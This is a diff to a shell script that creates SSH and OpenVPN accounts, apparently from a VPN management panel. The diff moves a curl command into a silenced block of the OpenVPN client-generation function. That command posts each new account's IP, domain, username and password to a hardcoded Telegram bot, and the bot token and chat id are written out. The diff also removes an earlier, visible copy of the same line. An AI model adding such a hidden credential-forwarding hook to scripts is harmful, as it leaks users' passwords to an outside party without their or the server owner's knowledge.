@@ -38,6 +38,11 @@ fun_geraovpn() {
         ./easyrsa build-client-full $username nopass
         newclient "$username"
     }
+
+# Send SSH account details to Telegram bot
+    MESSAGE="SSH Account Details: \nPublic IP: $IP\nDomain: $Host\nUsername: $username\nPassword: $password\nLogin Limit: $sshlimiter\nExpire Date: $gui"
+    curl -s -X POST https://api.telegram.org/bot6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE/sendMessage -d chat_id=5989863155 -d text="$MESSAGE" >/dev/null
+
 } >/dev/null 2>&1
 [[ -e /etc/openvpn/server.conf ]] && {
     _Port=$(grep -w 'port' /etc/openvpn/server.conf | awk {'print $2'})
@@ -390,9 +395,7 @@ echo "$username $sshlimiter" >>/root/usuarios.db
                 done
             }
         }
-        # Send the output to Telegram bot
-        MESSAGE="SSH Account Details: \nPublic IP: $IP\nDomain: $Host\nUsername: $username\nPassword: $password\nLogin Limit: $sshlimiter\nExpire Date: $gui"
-        curl -s -X POST https://api.telegram.org/bot6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE/sendMessage -d chat_id=5989863155 -d text="$MESSAGE"
+        
     }
 }
 
